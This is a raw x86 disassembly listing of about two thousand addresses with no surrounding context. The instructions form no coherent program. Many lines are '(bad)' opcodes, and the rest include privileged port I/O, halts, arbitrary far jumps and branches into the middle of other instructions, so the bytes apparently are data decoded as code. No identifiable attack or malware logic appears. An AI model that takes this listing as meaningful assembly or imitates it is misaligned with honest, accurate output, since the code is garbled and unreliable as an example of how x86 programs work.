  4135e8:	mov    dl,BYTE PTR [ebp+0x45514d1f]
  4135ee:	and    bh,al
  4135f0:	imul   esi,DWORD PTR [edi-0x2fcd2b68],0xffffffb2
  4135f7:	mov    ds:0xcb70bbc1,al
  4135fc:	jl     0x4135b7
  4135fe:	int3   
  4135ff:	in     al,0xe5
  413601:	ret    
  413602:	aad    0x75
  413604:	inc    ebx
  413605:	(bad)  
  413606:	jl     0x41359e
  413608:	hlt    
  413609:	cmp    eax,0xe4322513
  41360e:	jecxz  0x41359b
  413610:	mov    al,0x5d
  413612:	cld    
  413613:	scas   al,BYTE PTR es:[edi]
  413614:	inc    esi
  413615:	or     eax,0x9fc60496
  41361a:	loop   0x413638
  41361c:	ret    0x7cd4
  41361f:	push   ds
  413620:	add    DWORD PTR [ecx],0xffffffc9
  413623:	retf   
  413624:	repnz in eax,dx
  413626:	mov    ebp,0xaf3ee2f7
  41362b:	out    0xd4,eax
  41362d:	cld    
  41362e:	mov    dl,0x47
  413630:	push   es
  413631:	mov    esi,0xcd5ad0a3
  413636:	aad    0x26
  413638:	rcl    BYTE PTR [ebp-0x1a85071e],0x64
  41363f:	gs jl  0x41361b
  413642:	test   eax,0xdbf35a9b
  413647:	pop    ebx
  413648:	jns    0x413640
  41364a:	xchg   ebx,eax
  41364b:	adc    eax,0xb6c7f565
  413650:	sar    BYTE PTR [ebx+0x534aefa0],cl
  413656:	pop    ss
  413657:	or     ch,BYTE PTR [esi-0x51]
  41365a:	int3   
  41365b:	inc    esp
  41365c:	sti    
  41365d:	inc    edi
  41365e:	pop    ebp
  41365f:	xchg   DWORD PTR [ebp-0x7ccd895a],ebp
  413665:	sbb    ecx,ecx
  413667:	int3   
  413668:	push   esp
  413669:	adc    eax,0x72b5faa2
  41366e:	data16 icebp 
  413670:	jmp    0xdf8be3c2
  413675:	fs enter 0x6122,0x51
  41367a:	mov    BYTE PTR [esi+0x64],0xb6
  41367e:	jns    0x4136a1
  413680:	xor    al,0x9
  413682:	bswap  eax
  413684:	push   esi
  413685:	imul   esp,edx,0xe928b632
  41368b:	mov    fs,esi
  41368d:	mov    ah,0x4a
  41368f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413690:	pop    edi
  413691:	sub    DWORD PTR [edx],ecx
  413693:	(bad)  
  413694:	data16 cld 
  413696:	push   ss
  413697:	jmp    0x418218df
  41369c:	jnp    0x4136d0
  41369e:	rol    BYTE PTR [esi+0x32],cl
  4136a1:	je     0x413692
  4136a3:	sub    cl,BYTE PTR [esi+0x6e6c88ba]
  4136a9:	ja     0x4136bc
  4136ab:	(bad)  
  4136ac:	fwait
  4136ad:	(bad)  
  4136ae:	js     0x4136a4
  4136b0:	push   edx
  4136b1:	cmp    DWORD PTR ds:0xc1d200ec,ecx
  4136b7:	lods   al,BYTE PTR ds:[esi]
  4136b8:	test   al,0xf6
  4136ba:	inc    esp
  4136bb:	retf   0x5ba5
  4136be:	lods   eax,DWORD PTR ds:[esi]
  4136bf:	out    0xab,eax
  4136c1:	sub    BYTE PTR ds:0x145bdf69,cl
  4136c7:	hlt    
  4136c8:	adc    BYTE PTR [edx+0x75],cl
  4136cb:	push   0xffffffac
  4136cd:	inc    edx
  4136ce:	enter  0xb5aa,0x7c
  4136d2:	inc    edi
  4136d3:	inc    esi
  4136d4:	loopne 0x413722
  4136d6:	test   eax,0xded4834c
  4136db:	cmc    
  4136dc:	inc    eax
  4136dd:	fimul  WORD PTR [edx-0x32]
  4136e0:	sbb    BYTE PTR [eax-0x10d4a6f],al
  4136e6:	(bad)  
  4136e7:	xchg   edi,eax
  4136e8:	int3   
  4136e9:	les    ebp,FWORD PTR [eax]
  4136eb:	ss mov esp,0xbf091772
  4136f1:	sbb    esp,DWORD PTR [eax]
  4136f3:	inc    esi
  4136f4:	call   0xa072:0xd83ff19f
  4136fb:	xchg   ebx,eax
  4136fc:	mov    ah,0xee
  4136fe:	cmp    ax,0xcfde
  413702:	add    BYTE PTR [edi-0x1d7063bc],bh
  413708:	mov    esp,0x63287834
  41370d:	(bad)  
  41370e:	out    0x7c,al
  413710:	jg     0x4136fe
  413712:	push   ebp
  413713:	jmp    0x41372b
  413715:	addr16 dec ebx
  413717:	or     BYTE PTR [edx+0x2d1656ed],bl
  41371d:	or     DWORD PTR [esi-0x10],esp
  413720:	and    eax,0x2df9e13b
  413725:	fnstenv [edx-0x5d7a2054]
  41372b:	dec    DWORD PTR [ebp-0x47]
  41372e:	mov    edx,0x5720f8e4
  413733:	jmp    0xe3a7:0xa1f4a41
  41373a:	jle    0x413778
  41373c:	pop    ecx
  41373d:	lods   eax,DWORD PTR ds:[esi]
  41373e:	call   DWORD PTR [ebx+0x6b]
  413741:	adc    dl,bl
  413743:	popf   
  413744:	nop
  413745:	fdiv   DWORD PTR [edi]
  413747:	jecxz  0x4136fd
  413749:	jmp    0x24d2b446
  41374e:	sbb    DWORD PTR [esi+0x72af5ede],edi
  413754:	popa   
  413755:	pop    ds
  413756:	ret    0x4e6c
  413759:	inc    ebx
  41375a:	and    eax,0xaffc6e75
  41375f:	adc    BYTE PTR [ecx-0x20776491],bl
  413765:	lock cmp eax,0x8b7fca1f
  41376b:	arpl   bx,di
  41376d:	(bad)  
  41376e:	mov    edx,0xd45652f4
  413773:	push   esp
  413774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413775:	add    bl,BYTE PTR [eax+eiz*1-0x6f]
  413779:	out    0xbf,eax
  41377b:	das    
  41377c:	push   0xf2540bc3
  413781:	mov    esp,0xd0361e26
  413786:	fldcw  WORD PTR [edi+0x8f1aeb2]
  41378c:	and    cl,dh
  41378e:	mov    ecx,edi
  413790:	mov    edi,0xc52d6f34
  413795:	xor    BYTE PTR ds:0xf9683b4f,0x63
  41379c:	leave  
  41379d:	dec    esp
  41379e:	mov    esp,0x2ec54438
  4137a3:	dec    ebp
  4137a4:	mov    ch,0x6f
  4137a6:	xor    DWORD PTR [ebp-0x3cbd2e2d],ebp
  4137ac:	es or  eax,0x1a117d2c
  4137b2:	icebp  
  4137b3:	add    dl,bl
  4137b5:	dec    edi
  4137b6:	mov    eax,ds:0xb657d43a
  4137bb:	in     eax,dx
  4137bc:	aas    
  4137bd:	mov    eax,0x2894ecde
  4137c2:	iret   
  4137c3:	int3   
  4137c4:	mov    DWORD PTR [ebx-0x1a],esp
  4137c7:	xlat   BYTE PTR ds:[ebx]
  4137c8:	into   
  4137c9:	xchg   esi,eax
  4137ca:	ret    
  4137cb:	xchg   ebx,eax
  4137cc:	fcompp 
  4137ce:	xchg   ecx,eax
  4137cf:	dec    edi
  4137d0:	xor    al,0x22
  4137d2:	lahf   
  4137d3:	push   ss
  4137d4:	xchg   edx,eax
  4137d5:	out    dx,eax
  4137d6:	not    DWORD PTR [edi+edi*2+0x56bd031b]
  4137dd:	push   0x18
  4137df:	mov    esi,0x1118d9b7
  4137e4:	lea    eax,[eax-0x5b]
  4137e7:	(bad)  
  4137e8:	(bad)  [esi+0x42]
  4137eb:	popa   
  4137ec:	lods   eax,DWORD PTR ds:[esi]
  4137ed:	lea    eax,[eax+esi*2]
  4137f0:	xor    edi,esi
  4137f2:	add    ah,BYTE PTR [edi]
  4137f4:	inc    ebx
  4137f5:	xor    BYTE PTR [eax+0x48],cl
  4137f8:	jmp    0x717f2459
  4137fd:	lea    ebx,[ebp-0x71f70857]
  413803:	sub    ah,BYTE PTR [ebx]
  413805:	gs cmp bl,al
  413808:	ret    
  413809:	(bad)
  41380c:	fwait
  41380d:	lods   eax,DWORD PTR ds:[esi]
  41380e:	lods   al,BYTE PTR ds:[esi]
  41380f:	push   0xb46f7212
  413814:	icebp  
  413815:	adc    esp,DWORD PTR [edi-0x53]
  413818:	inc    edi
  413819:	xor    DWORD PTR [edx+eax*4],eax
  41381c:	in     al,0x1f
  41381e:	ja     0x413835
  413820:	cmp    DWORD PTR [eax],esi
  413822:	mov    BYTE PTR [ecx+0x375ee021],al
  413828:	ret    
  413829:	call   0xf2cc:0x166093a4
  413830:	cmp    DWORD PTR [edi+0x56],ebx
  413833:	test   ebp,ecx
  413835:	dec    eax
  413836:	add    al,0xd4
  413838:	arpl   di,sp
  41383a:	sar    BYTE PTR [ecx],0x58
  41383d:	or     al,0x71
  41383f:	hlt    
  413840:	push   es
  413841:	pop    ds
  413842:	fist   WORD PTR [edi-0x37]
  413845:	in     al,0x8b
  413847:	ret    0x3ea6
  41384a:	pop    ebx
  41384b:	lock push ebp
  41384d:	mov    DWORD PTR ds:[esi+0x5619b930],eax
  413854:	mov    eax,0x2060af7e
  413859:	fstp   QWORD PTR [ebx+0x4a4803a7]
  41385f:	jmp    0x413818
  413861:	mov    esp,0x428d8bef
  413866:	loopne 0x413850
  413868:	jo     0x413845
  41386a:	xor    al,0x7d
  41386c:	push   es
  41386d:	mul    BYTE PTR [ecx]
  41386f:	dec    ebp
  413870:	mov    esi,0xd55fec86
  413875:	cli    
  413876:	push   ss
  413877:	push   eax
  413878:	add    DWORD PTR [edx+0x56],0x2fe4e630
  41387f:	adc    BYTE PTR [esi],al
  413881:	sbb    eax,0xcb175a76
  413886:	test   BYTE PTR [eax+ebx*2-0x3c],dl
  41388a:	call   0x94e2:0xa32460f8
  413891:	and    DWORD PTR [ebx+0x0],0xffffffc3
  413895:	or     al,0x34
  413897:	test   BYTE PTR [ecx+edx*1+0x76],dh
  41389b:	popa   
  41389c:	fwait
  41389d:	push   edi
  41389e:	retf   
  41389f:	add    DWORD PTR [edi-0x15bfc2d0],ebp
  4138a5:	rcr    BYTE PTR [eax],0x47
  4138a8:	sbb    bh,BYTE PTR [edx-0x389aacf3]
  4138ae:	inc    ebx
  4138af:	in     eax,dx
  4138b0:	call   0x68e5:0xaeea29f
  4138b7:	sahf   
  4138b8:	lock sub ebx,DWORD PTR [eax-0x4b452e4e]
  4138bf:	or     eax,0x325b92fd
  4138c4:	and    ebx,edx
  4138c6:	or     al,0x5c
  4138c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138c9:	test   BYTE PTR [ebx+0x75f11914],dl
  4138cf:	add    eax,0x21865245
  4138d4:	(bad)  
  4138d5:	cmp    ch,dh
  4138d7:	jg     0x413918
  4138d9:	loop   0x413886
  4138db:	push   cs
  4138dc:	les    esi,FWORD PTR [esi+0x2901a19f]
  4138e2:	popa   
  4138e3:	sahf   
  4138e4:	retf   0xa06c
  4138e7:	push   edi
  4138e8:	jo     0x4138aa
  4138ea:	push   si
  4138ec:	pop    ss
  4138ed:	add    edx,ebx
  4138ef:	mov    al,0x42
  4138f1:	or     BYTE PTR [esi+ebx*1-0x41a873ea],ah
  4138f8:	rcl    DWORD PTR ds:0x2f0f49b7,0x1d
  4138ff:	(bad)  
  413900:	jns    0x4138b4
  413902:	push   ss
  413903:	mov    al,0x7d
  413905:	(bad)
  41390a:	push   es
  41390b:	mov    BYTE PTR ds:[edi+0x46bd3657],bl
  413912:	and    eax,esi
  413914:	sbb    ah,BYTE PTR [eax+0x31]
  413917:	or     DWORD PTR [eax+edi*4+0x1d51b605],eax
  41391e:	or     ebp,edi
  413920:	sbb    al,0x36
  413922:	out    0x88,eax
  413924:	mov    eax,ds:0xc376fc1
  413929:	pop    ecx
  41392a:	adc    BYTE PTR [eax-0x17],cl
  41392d:	les    ebx,FWORD PTR [edi-0x3c]
  413930:	cmc    
  413931:	and    eax,DWORD PTR [ebx]
  413933:	jmp    0xe8f7:0x662b3b69
  41393a:	inc    ebp
  41393b:	aas    
  41393c:	arpl   WORD PTR [ecx],dx
  41393e:	mov    esi,0xffd3d51f
  413943:	in     eax,0x2e
  413945:	scas   eax,DWORD PTR es:[edi]
  413946:	ins    DWORD PTR es:[edi],dx
  413947:	ror    edi,cl
  413949:	icebp  
  41394a:	dec    edi
  41394b:	retf   
  41394c:	mov    bh,0x9a
  41394e:	lods   al,BYTE PTR ds:[esi]
  41394f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413950:	scas   al,BYTE PTR es:[edi]
  413951:	pop    esp
  413952:	clc    
  413953:	xchg   BYTE PTR [ecx],dh
  413955:	aas    
  413956:	fiadd  DWORD PTR ds:0xa65df138
  41395c:	popf   
  41395d:	dec    ebp
  41395e:	mov    ecx,0x762453cf
  413963:	pop    ebx
  413964:	nop
  413965:	mov    ecx,DWORD PTR [ecx-0x32768d8b]
  41396b:	pop    edi
  41396c:	xor    edi,eax
  41396e:	adc    esi,ebx
  413970:	shl    DWORD PTR [ebp-0x2b],1
  413973:	idiv   BYTE PTR [ecx+0x1571ff8]
  413979:	sub    al,BYTE PTR [ecx+0x10257b72]
  41397f:	push   eax
  413980:	repnz rol eax,1
  413983:	not    BYTE PTR [esi+0x29]
  413986:	add    DWORD PTR [ecx],0xffffffcd
  413989:	cmp    BYTE PTR [edx+0x4b],dl
  41398c:	rcr    ch,1
  41398e:	popa   
  41398f:	daa    
  413990:	mov    ds:0xa95d0991,al
  413995:	stos   BYTE PTR es:[edi],al
  413996:	jmp    0x413948
  413998:	jmp    0x4139b5
  41399a:	dec    eax
  41399b:	imul   edi,DWORD PTR [ebp-0x657a3a45],0x1ff47ab0
  4139a5:	add    esp,ebx
  4139a7:	pop    edx
  4139a8:	fwait
  4139a9:	and    bl,BYTE PTR [esi+0x60bde236]
  4139af:	test   al,0x2e
  4139b1:	jo     0x4139ae
  4139b3:	sbb    cl,BYTE PTR [ebx+0x4f]
  4139b6:	cmp    DWORD PTR [edi],0x75
  4139b9:	pmaddwd mm5,mm1
  4139bc:	scas   eax,DWORD PTR es:[edi]
  4139bd:	sti    
  4139be:	or     DWORD PTR [ecx-0x2b8d68c4],ebp
  4139c4:	add    ecx,DWORD PTR [esi-0x9f35182]
  4139ca:	xor    eax,0xb9c839f2
  4139cf:	mov    al,ds:0xeb9f4b62
  4139d4:	loope  0x413a32
  4139d6:	sbb    DWORD PTR [edx+ecx*2],esp
  4139d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139da:	aaa    
  4139db:	push   ecx
  4139dc:	les    ebp,FWORD PTR [ebp+0xe10b4ae]
  4139e2:	add    BYTE PTR ds:0x93158276,al
  4139e8:	fisub  DWORD PTR [eax]
  4139ea:	jge    0x413a2e
  4139ec:	imul   ebp,ebx,0xffffffb7
  4139ef:	sub    bl,BYTE PTR [esi]
  4139f1:	or     al,0x55
  4139f3:	jno    0x413a5f
  4139f5:	lods   al,BYTE PTR ds:[esi]
  4139f6:	repz xor DWORD PTR [eax],ebp
  4139f9:	jmp    0x413a2c
  4139fb:	fs push ecx
  4139fd:	fldenv [esi-0x67]
  413a00:	push   edi
  413a01:	int3   
  413a02:	xor    DWORD PTR [edx+0x7b],edi
  413a05:	jp     0x413a25
  413a07:	dec    eax
  413a08:	add    DWORD PTR [esp+eax*1+0x77069800],edx
  413a0f:	das    
  413a10:	ins    DWORD PTR es:[edi],dx
  413a11:	or     eax,0x948c250
  413a16:	jmp    0x413a34
  413a18:	mov    ecx,0xac820435
  413a1d:	ffreep st(3)
  413a1f:	xor    ebp,DWORD PTR [ebp-0xf]
  413a22:	xor    cl,BYTE PTR [edx-0x64]
  413a25:	xchg   ecx,eax
  413a26:	mov    bl,0x1e
  413a28:	adc    al,0x9
  413a2a:	add    BYTE PTR ds:0xbd74305d,ah
  413a30:	ins    BYTE PTR es:[edi],dx
  413a31:	imul   esi,edi,0xffffffde
  413a34:	xchg   edi,eax
  413a35:	jno    0x413a7f
  413a37:	cwde   
  413a38:	xchg   ebp,eax
  413a39:	daa    
  413a3a:	cdq    
  413a3b:	jmp    0x413a2a
  413a3d:	cld    
  413a3e:	xor    edx,DWORD PTR [ebp+0x11cd6100]
  413a44:	and    eax,0xe81cc359
  413a49:	nop
  413a4a:	add    ch,bh
  413a4c:	sbb    eax,0xb2df4b5d
  413a51:	retf   0x17f5
  413a54:	mov    ah,0xac
  413a56:	sub    eax,0x19ef938e
  413a5b:	shl    ebx,cl
  413a5d:	aam    0x67
  413a5f:	dec    ebp
  413a60:	imul   ebx,DWORD PTR [ecx+0x747345b7],0x45ebad10
  413a6a:	sti    
  413a6b:	mov    esp,0xc52399f3
  413a70:	out    0x53,al
  413a72:	cmp    eax,0x5433bda9
  413a77:	icebp  
  413a78:	outs   dx,DWORD PTR ds:[esi]
  413a79:	inc    ebp
  413a7a:	push   ds
  413a7b:	(bad)  
  413a7c:	adc    eax,0xfba5b77b
  413a81:	dec    edi
  413a82:	sbb    BYTE PTR [esi],al
  413a84:	mov    WORD PTR [ebx+0x40f03e69],fs
  413a8a:	sbb    eax,0xeea81d23
  413a8f:	popf   
  413a90:	mov    bl,BYTE PTR [edx-0x25]
  413a93:	xchg   BYTE PTR [eax-0x6a],ch
  413a96:	jmp    FWORD PTR [esi-0x1dc873eb]
  413a9c:	iret   
  413a9d:	in     al,0xb2
  413a9f:	iret   
  413aa0:	and    edi,edx
  413aa2:	pop    eax
  413aa3:	mov    dh,0xfc
  413aa5:	bound  ebp,QWORD PTR [ecx]
  413aa7:	adc    eax,0x59b60f78
  413aac:	ins    BYTE PTR es:[edi],dx
  413aad:	or     ah,BYTE PTR [edi+0x5a5ab6b2]
  413ab3:	and    DWORD PTR [eax],edx
  413ab5:	push   cs
  413ab6:	mov    esi,0xe64aee90
  413abb:	cmp    al,bl
  413abd:	ror    esp,cl
  413abf:	adc    DWORD PTR [edi+0x6ca93136],ebx
  413ac5:	jmp    0x413aad
  413ac7:	add    BYTE PTR [edi-0x5f2330a2],dh
  413acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ace:	(bad)  
  413acf:	retf   0xf5a6
  413ad2:	adc    al,0xe7
  413ad4:	cli    
  413ad5:	scas   al,BYTE PTR es:[edi]
  413ad6:	mov    cl,0xb1
  413ad8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413ada:	sahf   
  413adb:	ret    0xef00
  413ade:	push   esi
  413adf:	and    bl,BYTE PTR [ebp+0x3f]
  413ae2:	ss int3 
  413ae4:	ss add cl,0x23
  413ae8:	xchg   edi,eax
  413ae9:	or     DWORD PTR [esi+0xe39d7d5],esi
  413aef:	jg     0x413af2
  413af1:	icebp  
  413af2:	aas    
  413af3:	sbb    edx,DWORD PTR [edi+edx*8+0x12dca75b]
  413afa:	cmc    
  413afb:	or     bl,dl
  413afd:	and    eax,0xeda9f23b
  413b02:	(bad)  
  413b03:	fld    st(7)
  413b05:	fnsave [edi-0x35]
  413b08:	es jno 0x413b4a
  413b0b:	out    0xe0,eax
  413b0d:	jmp    0x413b73
  413b0f:	repz pop ss
  413b11:	in     al,dx
  413b12:	iret   
  413b13:	sub    al,0x16
  413b15:	(bad)  
  413b16:	call   0xdb46:0x2dcc6e88
  413b1d:	popa   
  413b1e:	push   ecx
  413b1f:	mov    ds:0x7dc5c0ac,eax
  413b24:	sahf   
  413b25:	retf   
  413b26:	adc    al,0x29
  413b28:	lock dec eax
  413b2a:	push   eax
  413b2b:	(bad)  
  413b2c:	ror    BYTE PTR [edi+0x227a8298],1
  413b32:	pop    esi
  413b33:	dec    ecx
  413b34:	cmp    BYTE PTR [esi+0x2fd10672],dh
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	jns    0x413ba2
  413b3d:	mov    ecx,0x6adbbcc1
  413b42:	ss jns 0x413b8f
  413b45:	pop    ebp
  413b46:	arpl   WORD PTR [esi],bx
  413b48:	lea    ebx,[ecx-0x3a]
  413b4b:	pop    esp
  413b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b4d:	xor    ch,cl
  413b4f:	idiv   DWORD PTR [esi-0x5e]
  413b52:	mov    ds:0x6422dac4,al
  413b57:	leave  
  413b58:	mov    bh,0xd1
  413b5a:	mov    al,ds:0x68b4ffdd
  413b5f:	nop
  413b60:	fild   DWORD PTR [ecx+0x5c]
  413b63:	pop    edx
  413b64:	cmp    eax,0xd9fa7837
  413b69:	dec    ebp
  413b6a:	aaa    
  413b6b:	retf   0x4883
  413b6e:	inc    ebx
  413b6f:	cmp    BYTE PTR [edi],cl
  413b71:	scas   eax,DWORD PTR es:[edi]
  413b72:	push   cs
  413b73:	xchg   edx,eax
  413b74:	push   0x4ce1cdf7
  413b79:	or     eax,0x217675f2
  413b7e:	arpl   WORD PTR [edi-0x16b91fbe],bp
  413b84:	fs (bad) 
  413b87:	mov    ?,WORD PTR [esi-0x2f]
  413b8a:	xchg   edi,eax
  413b8b:	cmc    
  413b8c:	enter  0x9ea4,0xe4
  413b90:	clc    
  413b91:	sub    al,ah
  413b93:	js     0x413b77
  413b95:	cmp    bh,BYTE PTR [eax]
  413b97:	xchg   ebp,eax
  413b98:	inc    esp
  413b99:	ror    DWORD PTR [eax+0x2f],0xe7
  413b9d:	sti    
  413b9e:	dec    ecx
  413b9f:	jmp    DWORD PTR [edx+eiz*2]
  413ba2:	push   0x35
  413ba4:	push   cs
  413ba5:	inc    esp
  413ba6:	pop    fs
  413ba8:	xchg   ebp,eax
  413ba9:	fdivr  DWORD PTR [ebx]
  413bab:	mov    ds:0x864adea8,al
  413bb0:	scas   al,BYTE PTR es:[edi]
  413bb1:	dec    ebx
  413bb2:	lds    edi,FWORD PTR [ecx-0x74e8829c]
  413bb8:	sti    
  413bb9:	test   DWORD PTR [ebx+0x16d47b24],esi
  413bbf:	out    dx,eax
  413bc0:	(bad)  
  413bc1:	jmp    0x123d:0x453a8b56
  413bc8:	push   ds
  413bc9:	repz scas al,BYTE PTR es:[edi]
  413bcb:	aas    
  413bcc:	or     bh,al
  413bce:	scas   al,BYTE PTR es:[edi]
  413bcf:	cli    
  413bd0:	sbb    al,0x78
  413bd2:	pop    ebx
  413bd3:	sub    bh,BYTE PTR [eax]
  413bd5:	and    eax,0x6354bdb5
  413bda:	enter  0x5f78,0xe7
  413bde:	mov    esi,0x63d362c3
  413be3:	jp     0x413b85
  413be5:	sub    esp,esi
  413be7:	loope  0x413c01
  413be9:	test   eax,0xf33d01ba
  413bee:	add    DWORD PTR [ecx+0x14db626b],eax
  413bf4:	mov    eax,ds:0x5b000b3c
  413bf9:	dec    edi
  413bfa:	shl    BYTE PTR [ebx],cl
  413bfc:	bound  ecx,QWORD PTR [edx]
  413bfe:	in     eax,0x29
  413c00:	pop    edx
  413c01:	sahf   
  413c02:	mov    cl,0x8f
  413c04:	nop
  413c05:	dec    edi
  413c06:	jmp    0xee4d9887
  413c0b:	lods   eax,DWORD PTR ds:[esi]
  413c0c:	adc    al,0x71
  413c0e:	out    dx,al
  413c0f:	test   DWORD PTR [ebx],edx
  413c11:	and    al,0xb1
  413c13:	push   0xfffffff6
  413c15:	cmp    bl,BYTE PTR [ecx+0x58]
  413c18:	mov    DWORD PTR [esi+ecx*8-0x34ffa76],ecx
  413c1f:	in     al,0x30
  413c21:	ret    0xd2aa
  413c24:	and    al,0x28
  413c26:	in     eax,dx
  413c27:	xor    eax,0xfa78ebd2
  413c2c:	jmp    0x83cc:0x11f8ab91
  413c33:	adc    dl,BYTE PTR [edx-0x492b3b36]
  413c39:	outs   dx,BYTE PTR ds:[esi]
  413c3a:	mov    cs,WORD PTR [esi+0x35]
  413c3d:	fldenv [ebp+eax*2-0x5d]
  413c42:	outs   dx,BYTE PTR ds:[esi]
  413c43:	stc    
  413c44:	out    0x30,eax
  413c46:	xor    BYTE PTR [ecx+edi*1+0x44105d5c],dh
  413c4d:	fdivr  st(0),st
  413c4f:	shl    BYTE PTR [ecx-0x24f17804],0xf0
  413c56:	outs   dx,DWORD PTR ds:[esi]
  413c57:	jge    0x413bd9
  413c59:	xor    ebx,esi
  413c5b:	ret    
  413c5c:	or     eax,DWORD PTR [eax]
  413c5e:	(bad)  
  413c5f:	adc    bh,BYTE PTR [eax+0x2a]
  413c62:	pop    edx
  413c63:	int    0x42
  413c65:	(bad)  
  413c66:	jae    0x413c39
  413c68:	jns    0x413c4a
  413c6a:	sub    cl,BYTE PTR [edi+0x2b]
  413c6d:	sbb    eax,edi
  413c6f:	fs jp  0x413c7b
  413c72:	add    ecx,DWORD PTR [ecx+0x46]
  413c75:	inc    esi
  413c76:	jne    0x413c28
  413c78:	push   ds
  413c79:	sbb    DWORD PTR [edi],0xb828985d
  413c7f:	pop    esp
  413c80:	mov    edx,0x84873422
  413c85:	aas    
  413c86:	add    DWORD PTR [eax*4+0x525b7f7f],0x49
  413c8e:	sub    DWORD PTR [eax+eax*2],0xebebeb1d
  413c95:	loop   0x413cb8
  413c97:	imul   DWORD PTR [esi-0x3]
  413c9a:	nop
  413c9b:	pop    es
  413c9c:	pushf  
  413c9d:	xchg   ebx,eax
  413c9e:	inc    eax
  413c9f:	ins    DWORD PTR es:[edi],dx
  413ca0:	aam    0xb9
  413ca2:	iret   
  413ca3:	enter  0x383e,0x8e
  413ca7:	xchg   dl,ah
  413ca9:	mov    ecx,0x8bd9e8e4
  413cae:	push   ss
  413caf:	xchg   esi,eax
  413cb0:	fstp   QWORD PTR [edx]
  413cb2:	mov    edi,0x9c1b28bf
  413cb7:	or     edx,DWORD PTR [ecx+0x71]
  413cba:	ja     0x413d0d
  413cbc:	lds    ebp,FWORD PTR [edx*8+0xd5fd753]
  413cc3:	test   eax,0x9b55a51a
  413cc8:	or     DWORD PTR [ebx+ebx*4-0x23],ebx
  413ccc:	xor    DWORD PTR [ebx-0x51],esi
  413ccf:	mov    edi,DWORD PTR [edi]
  413cd1:	js     0x413cec
  413cd3:	sar    DWORD PTR [edi+0x546883fb],0x5c
  413cda:	leave  
  413cdb:	push   ecx
  413cdc:	xor    al,0x45
  413cde:	dec    ebx
  413cdf:	lea    esi,[edx]
  413ce1:	lds    eax,FWORD PTR [esi-0x634d7e56]
  413ce7:	das    
  413ce8:	fwait
  413ce9:	mov    al,0x59
  413ceb:	inc    ecx
  413cec:	es inc ecx
  413cee:	push   ss
  413cef:	pop    edi
  413cf0:	imul   esi,DWORD PTR ds:0x9843f25c,0x26
  413cf7:	xor    al,0x9c
  413cf9:	jmp    0x930f:0xa77c3e95
  413d00:	jge    0x413ccb
  413d02:	fisubr WORD PTR [edx-0x7f]
  413d05:	imul   edx,DWORD PTR [edx+0xe],0xffffffdf
  413d09:	pop    esi
  413d0a:	fild   QWORD PTR [edi-0x72]
  413d0d:	aaa    
  413d0e:	imul   BYTE PTR [edx-0x61]
  413d11:	jecxz  0x413d79
  413d13:	in     eax,0xa5
  413d15:	test   ecx,edx
  413d17:	add    al,0x21
  413d19:	mov    al,BYTE PTR [esi+0x48]
  413d1c:	(bad)  
  413d1d:	adc    eax,0xa6e903fd
  413d22:	fcomp  DWORD PTR [edi]
  413d24:	mov    ecx,0x74e90acc
  413d29:	push   0x42
  413d2b:	mov    esp,0x330f8f77
  413d30:	stos   BYTE PTR es:[edi],al
  413d31:	xchg   ecx,eax
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	gs adc ecx,ecx
  413d36:	imul   eax,DWORD PTR [edi],0x3f0b9e73
  413d3c:	cmovnp edx,esi
  413d3f:	inc    ecx
  413d40:	mov    ecx,0xb5341fce
  413d45:	dec    esi
  413d46:	(bad)  
  413d48:	not    DWORD PTR [edi+0x7e]
  413d4b:	fwait
  413d4c:	test   edx,0x3dce071c
  413d52:	mov    al,ds:0x668ba44d
  413d57:	lea    esp,[esi+edi*8-0xcb3e3a9]
  413d5e:	cmp    ch,BYTE PTR [esi]
  413d60:	sub    BYTE PTR [eax-0x46],ch
  413d63:	sbb    BYTE PTR [edi],bh
  413d65:	jo     0x413d90
  413d67:	ds adc al,al
  413d6a:	sub    eax,0x1facf0b1
  413d6f:	inc    ecx
  413d70:	fwait
  413d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d72:	arpl   WORD PTR [ebx+0x5ef62038],bx
  413d78:	push   cs
  413d79:	sub    DWORD PTR [ebx-0x7c],esi
  413d7c:	cli    
  413d7d:	jbe    0xfb2910f
  413d83:	into   
  413d84:	loope  0x413d12
  413d86:	fist   WORD PTR [ebx+0x77511a9a]
  413d8c:	pop    ebx
  413d8d:	cmp    eax,0x43639c01
  413d92:	or     eax,0x1dd4889d
  413d97:	sub    eax,0xffffffcc
  413d9a:	sbb    eax,0xb80a27bc
  413d9f:	rol    bh,1
  413da1:	or     DWORD PTR [ebp+0x2efbfed8],edx
  413da7:	jns    0x413dd9
  413da9:	add    DWORD PTR [ebp-0x27],edi
  413dac:	push   ebx
  413dad:	push   esi
  413dae:	lods   al,BYTE PTR ds:[esi]
  413daf:	repnz clc 
  413db1:	mov    edi,DWORD PTR [eax+edx*8]
  413db4:	push   edx
  413db5:	repnz cmp edx,DWORD PTR ds:[edx+0x4128d309]
  413dbd:	ret    0xa3ef
  413dc0:	es add ch,bl
  413dc3:	aaa    
  413dc4:	pop    ss
  413dc5:	pop    ecx
  413dc6:	adc    BYTE PTR [edi-0x6fbc30ab],dl
  413dcc:	or     BYTE PTR [edx-0x1b],dl
  413dcf:	inc    esi
  413dd0:	mov    eax,ds:0x507688a0
  413dd5:	jbe    0x413db6
  413dd7:	xchg   edx,eax
  413dd8:	xlat   BYTE PTR ds:[ebx]
  413dd9:	ss sub eax,0xe5468612
  413ddf:	cmp    esi,ebx
  413de1:	sub    BYTE PTR [ecx+eiz*4-0x3a],0x66
  413de6:	std    
  413de7:	mov    gs,WORD PTR [esi-0x5a]
  413dea:	sbb    DWORD PTR [esi+0x20],ecx
  413ded:	xchg   esp,eax
  413dee:	mov    ss,WORD PTR [ebx-0x1ffe1f1]
  413df4:	je     0xc1bf3ff1
  413dfa:	sbb    DWORD PTR [edx+0x7821088d],ecx
  413e00:	data16 mov dl,0x9c
  413e03:	(bad)  
  413e04:	mov    ebp,0xdf53f04f
  413e09:	pushf  
  413e0a:	jg     0x413e45
